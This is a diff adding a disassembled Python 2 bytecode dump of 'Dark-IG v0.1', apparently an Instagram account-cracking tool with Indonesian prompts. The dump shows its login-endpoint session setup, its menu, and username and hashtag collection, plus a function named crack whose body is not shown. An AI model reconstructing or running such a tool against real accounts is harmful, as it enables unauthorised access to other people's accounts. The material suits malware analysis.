+            236         287 LOAD_FAST                2 (sim)
+                        290 LOAD_ATTR               14 (write)
+                        293 LOAD_FAST               13 (id)
+                        296 LOAD_CONST              19 ('\n')
+                        299 BINARY_ADD          
+                        300 CALL_FUNCTION            1
+                        303 POP_TOP             
+            
+            237         304 LOAD_GLOBAL             15 (name)
+                        307 LOAD_ATTR               13 (append)
+                        310 LOAD_FAST               13 (id)
+                        313 CALL_FUNCTION            1
+                        316 POP_TOP             
+                        317 JUMP_ABSOLUTE          185
+                    >>  320 POP_BLOCK           
+                    >>  321 POP_BLOCK           
+                        322 JUMP_FORWARD            39 (to 364)
+            
+            238     >>  325 DUP_TOP             
+                        326 LOAD_GLOBAL             16 (IOError)
+                        329 COMPARE_OP              10 (exception match)
+                        332 POP_JUMP_IF_FALSE      363
+                        335 POP_TOP             
+                        336 POP_TOP             
+                        337 POP_TOP             
+            
+            239         338 LOAD_CONST              20 ('\x1b[1;91m[!] Error')
+                        341 PRINT_ITEM          
+                        342 PRINT_NEWLINE       
+            
+            240         343 LOAD_GLOBAL              3 (raw_input)
+                        346 LOAD_CONST              21 ('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                        349 CALL_FUNCTION            1
+                        352 POP_TOP             
+            
+            241         353 LOAD_GLOBAL             17 (menu)
+                        356 CALL_FUNCTION            0
+                        359 POP_TOP             
+                        360 JUMP_FORWARD             1 (to 364)
+                    >>  363 END_FINALLY         
+            
+            242     >>  364 LOAD_CONST              22 ('\n\r\x1b[1;91m[?] \x1b[1;97mJumlah    \x1b[1;91m: \x1b[1;97musr/\x1b[1;96m')
+                        367 LOAD_GLOBAL             18 (str)
+                        370 LOAD_GLOBAL             19 (len)
+                        373 LOAD_GLOBAL             15 (name)
+                        376 CALL_FUNCTION            1
+                        379 CALL_FUNCTION            1
+                        382 BINARY_ADD          
+                        383 LOAD_CONST              23 (' \x1b[1;97mtag/\x1b[1;96m')
+                        386 BINARY_ADD          
+                        387 LOAD_GLOBAL             18 (str)
+                        390 LOAD_GLOBAL             19 (len)
+                        393 LOAD_GLOBAL             12 (has)
+                        396 CALL_FUNCTION            1
+                        399 CALL_FUNCTION            1
+                        402 BINARY_ADD          
+                        403 PRINT_ITEM          
+                        404 PRINT_NEWLINE       
+            
+            243         405 LOAD_CONST              24 ('\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m ')
+                        408 LOAD_FAST                1 (simpan)
+                        411 BINARY_ADD          
+                        412 PRINT_ITEM          
+                        413 PRINT_NEWLINE       
+            
+            244         414 LOAD_FAST                2 (sim)
+                        417 LOAD_ATTR                8 (close)
+                        420 CALL_FUNCTION            0
+                        423 POP_TOP             
+            
+            245         424 LOAD_GLOBAL              3 (raw_input)
+                        427 LOAD_CONST              21 ('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                        430 CALL_FUNCTION            1
+                        433 POP_TOP             
+            
+            246         434 LOAD_GLOBAL             17 (menu)
+                        437 CALL_FUNCTION            0
+                        440 POP_TOP             
+                        441 LOAD_CONST               0 (None)
+                        444 RETURN_VALUE        
+            
+      31 '__main__'
+   co_code
+      64 00 00 64 01 00 6c 00 00 5a 00 00 64 00 00 64
+      01 00 6c 01 00 5a 01 00 64 00 00 64 01 00 6c 02
+      00 5a 02 00 64 00 00 64 01 00 6c 03 00 5a 03 00
+      64 00 00 64 02 00 6c 03 00 6d 04 00 5a 05 00 01
+      64 00 00 64 03 00 6c 06 00 6d 07 00 5a 08 00 01
+      64 00 00 64 01 00 6c 09 00 5a 09 00 79 10 00 64
+      00 00 64 01 00 6c 0a 00 5a 0a 00 57 6e e8 00 04
+      65 0b 00 6b 0a 00 72 56 01 01 01 01 65 00 00 6a
+      0c 00 64 04 00 83 01 00 01 65 0d 00 64 05 00 83
+      01 00 5a 0e 00 65 0e 00 64 06 00 6b 02 00 72 b6
+      00 64 07 00 47 48 65 00 00 6a 01 00 6a 0f 00 83
+      00 00 01 71 57 01 65 0e 00 64 08 00 6b 02 00 72
+      d9 00 65 00 00 6a 0c 00 64 09 00 83 01 00 01 65
+      0f 00 83 00 00 01 71 57 01 65 0e 00 64 0a 00 6b
+      02 00 72 fc 00 65 00 00 6a 0c 00 64 09 00 83 01
+      00 01 65 0f 00 83 00 00 01 71 57 01 65 0e 00 64
+      0b 00 6b 02 00 72 18 01 65 00 00 6a 01 00 6a 0f
+      00 83 00 00 01 71 57 01 65 0e 00 64 0c 00 6b 02
+      00 72 34 01 65 00 00 6a 01 00 6a 0f 00 83 00 00
+      01 71 57 01 64 0d 00 47 48 65 02 00 6a 10 00 64
+      0e 00 83 01 00 01 65 00 00 6a 01 00 6a 0f 00 83
+      00 00 01 6e 01 00 58 64 0f 00 5a 11 00 65 11 00
+      64 10 00 17 5a 12 00 65 0a 00 6a 13 00 83 00 00
+      5a 14 00 69 01 00 64 11 00 64 12 00 36 65 14 00
+      5f 15 00 65 14 00 6a 15 00 6a 16 00 69 01 00 65
+      11 00 64 13 00 36 83 01 00 01 64 00 00 64 14 00
+      6c 17 00 6d 18 00 5a 18 00 01 64 15 00 84 00 00
+      5a 19 00 64 16 00 84 00 00 5a 1a 00 64 17 00 5a
+      1b 00 64 18 00 61 1c 00 67 00 00 61 1d 00 67 00
+      00 61 1e 00 67 00 00 5a 1f 00 67 00 00 5a 20 00
+      64 19 00 84 00 00 5a 21 00 64 1a 00 84 00 00 5a
+      22 00 64 1b 00 84 00 00 5a 23 00 64 1c 00 84 00
+      00 5a 24 00 64 1d 00 84 00 00 5a 25 00 64 1e 00
+      84 00 00 5a 26 00 65 27 00 64 1f 00 6b 02 00 72
+      2c 02 65 21 00 83 00 00 01 6e 00 00 64 01 00 53
+      disassembled:
+        2           0 LOAD_CONST               0 (-1)
+                    3 LOAD_CONST               1 (None)
+                    6 IMPORT_NAME              0 (os)
+                    9 STORE_NAME               0 (os)
+                   12 LOAD_CONST               0 (-1)
+                   15 LOAD_CONST               1 (None)
+                   18 IMPORT_NAME              1 (sys)
+                   21 STORE_NAME               1 (sys)
+                   24 LOAD_CONST               0 (-1)
+                   27 LOAD_CONST               1 (None)
+                   30 IMPORT_NAME              2 (time)
+                   33 STORE_NAME               2 (time)
+      
+        3          36 LOAD_CONST               0 (-1)
+                   39 LOAD_CONST               1 (None)
+                   42 IMPORT_NAME              3 (urllib)
+                   45 STORE_NAME               3 (urllib)
+      
+        4          48 LOAD_CONST               0 (-1)
+                   51 LOAD_CONST               2 (('urlopen',))
+                   54 IMPORT_NAME              3 (urllib)
+                   57 IMPORT_FROM              4 (urlopen)
+                   60 STORE_NAME               5 (buka)
+                   63 POP_TOP             
+      
+        5          64 LOAD_CONST               0 (-1)
+                   67 LOAD_CONST               3 (('BeautifulSoup',))
+                   70 IMPORT_NAME              6 (bs4)
+                   73 IMPORT_FROM              7 (BeautifulSoup)
+                   76 STORE_NAME               8 (soup)
+                   79 POP_TOP             
+      
+        6          80 LOAD_CONST               0 (-1)
+                   83 LOAD_CONST               1 (None)
+                   86 IMPORT_NAME              9 (json)
+                   89 STORE_NAME               9 (json)
+      
+        7          92 SETUP_EXCEPT            16 (to 111)
+      
+        8          95 LOAD_CONST               0 (-1)
+                   98 LOAD_CONST               1 (None)
+                  101 IMPORT_NAME             10 (requests)
+                  104 STORE_NAME              10 (requests)
+                  107 POP_BLOCK           
+                  108 JUMP_FORWARD           232 (to 343)
+      
+        9     >>  111 DUP_TOP             
+                  112 LOAD_NAME               11 (ImportError)
+                  115 COMPARE_OP              10 (exception match)
+                  118 POP_JUMP_IF_FALSE      342
+                  121 POP_TOP             
+                  122 POP_TOP             
+                  123 POP_TOP             
+      
+       10         124 LOAD_NAME                0 (os)
+                  127 LOAD_ATTR               12 (system)
+                  130 LOAD_CONST               4 ('reset')
+                  133 CALL_FUNCTION            1
+                  136 POP_TOP             
+      
+       11         137 LOAD_NAME               13 (raw_input)
+                  140 LOAD_CONST               5 ('\x1b[1;91m[+] \x1b[1;92mPerlu install requests \x1b[1;97m(y/t): ')
+                  143 CALL_FUNCTION            1
+                  146 STORE_NAME              14 (rqs)
+      
+       12         149 LOAD_NAME               14 (rqs)
+                  152 LOAD_CONST               6 ('')
+                  155 COMPARE_OP               2 (==)
+                  158 POP_JUMP_IF_FALSE      182
+      
+       13         161 LOAD_CONST               7 ('\x1b[1;91m[!] Jangan kosong')
+                  164 PRINT_ITEM          
+                  165 PRINT_NEWLINE       
+      
+       14         166 LOAD_NAME                0 (os)
+                  169 LOAD_ATTR                1 (sys)
+                  172 LOAD_ATTR               15 (exit)
+                  175 CALL_FUNCTION            0
+                  178 POP_TOP             
+                  179 JUMP_ABSOLUTE          343
+      
+       15     >>  182 LOAD_NAME               14 (rqs)
+                  185 LOAD_CONST               8 ('y')
+                  188 COMPARE_OP               2 (==)
+                  191 POP_JUMP_IF_FALSE      217
+      
+       16         194 LOAD_NAME                0 (os)
+                  197 LOAD_ATTR               12 (system)
+                  200 LOAD_CONST               9 ('pip2 install requests')
+                  203 CALL_FUNCTION            1
+                  206 POP_TOP             
+      
+       17         207 LOAD_NAME               15 (exit)
+                  210 CALL_FUNCTION            0
+                  213 POP_TOP             
+                  214 JUMP_ABSOLUTE          343
+      
+       18     >>  217 LOAD_NAME               14 (rqs)
+                  220 LOAD_CONST              10 ('Y')
+                  223 COMPARE_OP               2 (==)
+                  226 POP_JUMP_IF_FALSE      252
+      
+       19         229 LOAD_NAME                0 (os)
+                  232 LOAD_ATTR               12 (system)
+                  235 LOAD_CONST               9 ('pip2 install requests')
+                  238 CALL_FUNCTION            1
+                  241 POP_TOP             
+      
+       20         242 LOAD_NAME               15 (exit)
+                  245 CALL_FUNCTION            0
+                  248 POP_TOP             
+                  249 JUMP_ABSOLUTE          343
+      
+       21     >>  252 LOAD_NAME               14 (rqs)
+                  255 LOAD_CONST              11 ('t')
+                  258 COMPARE_OP               2 (==)
+                  261 POP_JUMP_IF_FALSE      280
+      
+       22         264 LOAD_NAME                0 (os)
+                  267 LOAD_ATTR                1 (sys)
+                  270 LOAD_ATTR               15 (exit)
+                  273 CALL_FUNCTION            0
+                  276 POP_TOP             
+                  277 JUMP_ABSOLUTE          343
+      
+       23     >>  280 LOAD_NAME               14 (rqs)
+                  283 LOAD_CONST              12 ('T')
+                  286 COMPARE_OP               2 (==)
+                  289 POP_JUMP_IF_FALSE      308
+      
+       24         292 LOAD_NAME                0 (os)
+                  295 LOAD_ATTR                1 (sys)
+                  298 LOAD_ATTR               15 (exit)
+                  301 CALL_FUNCTION            0
+                  304 POP_TOP             
+                  305 JUMP_ABSOLUTE          343
+      
+       26     >>  308 LOAD_CONST              13 ('\x1b[1;91m[!]\x1b[1;92m Pilih\x1b[1;93m (y/n)')
+                  311 PRINT_ITEM          
+                  312 PRINT_NEWLINE       
+      
+       27         313 LOAD_NAME                2 (time)
+                  316 LOAD_ATTR               16 (sleep)
+                  319 LOAD_CONST              14 (1)
+                  322 CALL_FUNCTION            1
+                  325 POP_TOP             
+      
+       28         326 LOAD_NAME                0 (os)
+                  329 LOAD_ATTR                1 (sys)
+                  332 LOAD_ATTR               15 (exit)
+                  335 CALL_FUNCTION            0
+                  338 POP_TOP             
+                  339 JUMP_FORWARD             1 (to 343)
+              >>  342 END_FINALLY         
+      
+       31     >>  343 LOAD_CONST              15 ('https://www.instagram.com/')
+                  346 STORE_NAME              17 (base)
+      
+       32         349 LOAD_NAME               17 (base)
+                  352 LOAD_CONST              16 ('accounts/login/ajax/')
+                  355 BINARY_ADD          
+                  356 STORE_NAME              18 (url)
+      
+       33         359 LOAD_NAME               10 (requests)
+                  362 LOAD_ATTR               19 (Session)
+                  365 CALL_FUNCTION            0
+                  368 STORE_NAME              20 (session)
+      
+       34         371 BUILD_MAP                1
+      
+       35         374 LOAD_CONST              17 ('Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36')
+                  377 LOAD_CONST              18 ('user-agent')
+                  380 STORE_MAP           
+                  381 LOAD_NAME               20 (session)
+                  384 STORE_ATTR              21 (headers)
+      
+       36         387 LOAD_NAME               20 (session)
+                  390 LOAD_ATTR               21 (headers)
+                  393 LOAD_ATTR               22 (update)
+                  396 BUILD_MAP                1
+                  399 LOAD_NAME               17 (base)
+                  402 LOAD_CONST              19 ('Referer')
+                  405 STORE_MAP           
+                  406 CALL_FUNCTION            1
+                  409 POP_TOP             
+      
+       37         410 LOAD_CONST               0 (-1)
+                  413 LOAD_CONST              20 (('ConnectionError',))
+                  416 IMPORT_NAME             23 (requests.exceptions)
+                  419 IMPORT_FROM             24 (ConnectionError)
+                  422 STORE_NAME              24 (ConnectionError)
+                  425 POP_TOP             
+      
+       40         426 LOAD_CONST              21 (<code object jalan at 0xb63d5578, file "<script>", line 40>)
+                  429 MAKE_FUNCTION            0
+                  432 STORE_NAME              25 (jalan)
+      
+       47         435 LOAD_CONST              22 (<code object keluar at 0xb63d5650, file "<script>", line 47>)
+                  438 MAKE_FUNCTION            0
+                  441 STORE_NAME              26 (keluar)
+      
+       65         444 LOAD_CONST              23 ("\x1b[1;97m\n ___    ___\n( _<    >_ )\n//        \\\\\n\\\\___\x1b[1;91m..\x1b[1;97m___//               \x1b[1;92m[\x1b[1;97mDark-IG\x1b[1;92m]\x1b[1;93mv0.1\x1b[1;97m\n `-(    )-'\n   _|__|_   \x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mZeDD\x1b[1;97m\n  /_|__|_\\  \x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96mLimite\x1b[1;97m[\x1b[1;96mD\x1b[1;97m] \x1b[1;97m/ \x1b[1;96m./R41N53 \x1b[1;97m/ \x1b[1;96mAl2VyN\x1b[1;97m\n  /_|__|_\\  \x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/rezadkim\x1b[0m\x1b[1;97m\n  /_\\__/_\\  =========================================\n   \\ || /  _)\n     ||   ( )\n     \\\\___//\n      `---' ")
+                  447 STORE_NAME              27 (logo)
+      
+       67         450 LOAD_CONST              24 (0)
+                  453 STORE_GLOBAL            28 (back)
+      
+       68         456 BUILD_LIST               0
+                  459 STORE_GLOBAL            29 (berhasil)
+      
+       69         462 BUILD_LIST               0
+                  465 STORE_GLOBAL            30 (gagal)
+      
+       70         468 BUILD_LIST               0
+                  471 STORE_NAME              31 (name)
+      
+       71         474 BUILD_LIST               0
+                  477 STORE_NAME              32 (has)
+      
+       74         480 LOAD_CONST              25 (<code object menu at 0xb63d56e0, file "<script>", line 74>)
+                  483 MAKE_FUNCTION            0
+                  486 STORE_NAME              33 (menu)
+      
+       86         489 LOAD_CONST              26 (<code object chose at 0xb63d57b8, file "<script>", line 86>)
+                  492 MAKE_FUNCTION            0
+                  495 STORE_NAME              34 (chose)
+      
+      114         498 LOAD_CONST              27 (<code object informasi at 0xb63d58d8, file "<script>", line 114>)
+                  501 MAKE_FUNCTION            0
+                  504 STORE_NAME              35 (informasi)
+      
+      150         507 LOAD_CONST              28 (<code object crack at 0xb63d59b0, file "<script>", line 150>)
+                  510 MAKE_FUNCTION            0
+                  513 STORE_NAME              36 (crack)
+      
+      196         516 LOAD_CONST              29 (<code object hasil at 0xb63d5a40, file "<script>", line 196>)
+                  519 MAKE_FUNCTION            0
+                  522 STORE_NAME              37 (hasil)
+      
+      209         525 LOAD_CONST              30 (<code object search at 0xb63d5b60, file "<script>", line 209>)
+                  528 MAKE_FUNCTION            0
+                  531 STORE_NAME              38 (search)
+      
+      248         534 LOAD_NAME               39 (__name__)
+                  537 LOAD_CONST              31 ('__main__')
+                  540 COMPARE_OP               2 (==)
+                  543 POP_JUMP_IF_FALSE      556
+      
+      249         546 LOAD_NAME               33 (menu)
+                  549 CALL_FUNCTION            0
+                  552 POP_TOP             
+                  553 JUMP_FORWARD             0 (to 556)
+              >>  556 LOAD_CONST               1 (None)
+                  559 RETURN_VALUE        
+      
+  ## done inspecting pyc file ##
